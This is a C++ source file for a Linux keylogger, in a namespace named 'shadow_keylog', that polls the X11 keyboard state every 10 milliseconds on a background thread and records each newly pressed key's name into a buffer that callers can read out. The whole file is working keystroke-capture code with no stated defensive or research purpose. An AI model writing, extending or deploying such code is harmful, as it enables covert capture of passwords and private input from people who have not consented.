#include "keylogger.hpp"
#include <X11/Xlib.h>
#include <X11/extensions/XTest.h>
#include <X11/keysym.h>
#include <unistd.h>

namespace shadow_keylog {

Keylogger::Keylogger() : logger_thread(nullptr), running(false) {}

Keylogger::~Keylogger() {
    if (running) stop();
}

void Keylogger::log_keys() {
    Display* display = XOpenDisplay(nullptr);
    if (!display) return;
    
    char keys[32];
    char last_keys[32] = {0};
    
    while (running) {
        XQueryKeymap(display, keys);
        
        for (int i = 0; i < 32; i++) {
            if (keys[i] != last_keys[i]) {
                for (int j = 0; j < 8; j++) {
                    int keycode = i * 8 + j;
                    bool pressed = (keys[i] >> j) & 1;
                    bool was_pressed = (last_keys[i] >> j) & 1;
                    
                    if (pressed && !was_pressed) {
                        KeySym keysym = XKeycodeToKeysym(display, keycode, 0);
                        if (keysym) {
                            char* keyname = XKeysymToString(keysym);
                            if (keyname) {
                                buffer += keyname;
                                buffer += " ";
                            }
                        }
                    }
                }
            }
        }
        
        memcpy(last_keys, keys, 32);
        usleep(10000); // 10ms
    }
    
    XCloseDisplay(display);
}

void Keylogger::start() {
    if (running) return;
    running = true;
    logger_thread = new std::thread(&Keylogger::log_keys, this);
}

void Keylogger::stop() {
    if (!running) return;
    running = false;
    if (logger_thread) {
        logger_thread->join();
        delete logger_thread;
        logger_thread = nullptr;
    }
}

std::string Keylogger::get_buffer() {
    return buffer;
}

} // namespace shadow_keylog
